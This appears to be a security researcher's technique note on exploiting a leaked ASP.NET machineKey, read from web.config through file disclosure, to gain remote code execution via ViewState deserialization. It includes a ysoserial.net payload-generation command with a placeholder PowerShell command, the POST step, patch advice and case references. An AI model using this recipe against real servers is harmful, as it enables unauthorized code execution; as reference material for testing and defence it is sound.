---
title: ASP.NET machineKey leak → ViewState deserialization RCE
slug: aspnet-machinekey-rce
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/server-side, technique/rce, technique/deserialization]
inbound: []
---

# ASP.NET machineKey → ViewState RCE

## Pattern
When LFI/LFD on an ASP.NET app exposes `web.config` containing the prod
`machineKey` / `validationKey`, craft deserializable `__VIEWSTATE` payload
with ysoserial.net → RCE. Critical detail: an `.aspx` page with
`EnableViewState="false"` is **still** parsed for VIEWSTATE since 2014 —
the attribute is silently ignored.

## Preconditions
- LFI/LFD that reaches `web.config`.
- ASP.NET web app with at least one `.aspx` endpoint reachable.

## Detection
- Read `web.config` via LFI.
- Extract `<machineKey validationKey="..." decryptionKey="..."
  validation="..." decryption="..."/>`.

## Triggering
```sh
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc <attacker cmd>" \
  --apppath="/" \
  --path="/Page.aspx" \
  --validationkey="<HEX>" \
  --validationalg="<ALG>"
```
POST `__VIEWSTATE=<payload>` to any `.aspx` page.

## Patch
Rotating machineKey is the fix (not deleting the leaked file). Store keys
in Windows registry per Microsoft guidance — ~90% don't.

## Related
- [[iis-cookieless-bypass]]
- DLL decompile via dotPeek to expand source after leaked zip (Ep 49).

## Seen in the wild
- Sitecore Mailing-list renderer-user auth bypass chain → web.config LFD
  → Telerik machineKey → deserialization RCE (Dylan Pinder, asseth).
- Critical Thinking Podcast Eps 19, 49.

## References
- ysoserial.net — ASP.NET deserialization gadget gen
- Bishop Fox + asseth Citrix/Sitecore patch-diff writeups
- Critical Thinking Podcast Eps 19, 49
